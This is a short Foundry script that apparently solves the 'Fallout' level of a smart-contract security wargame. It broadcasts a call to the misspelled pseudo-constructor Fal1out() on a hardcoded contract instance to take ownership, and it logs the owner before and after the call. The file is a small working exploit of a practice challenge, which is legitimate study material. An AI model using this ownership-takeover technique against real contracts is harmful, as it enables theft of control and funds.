// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0x347A2431BB28c6935d75B2590Fe43CAf08bb9358);

    function run() external {
 
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      console.log("Owner before", falloutInstance.owner());
      
      falloutInstance.Fal1out();

      console.log("Owner after", falloutInstance.owner());
      vm.stopBroadcast();
    }

}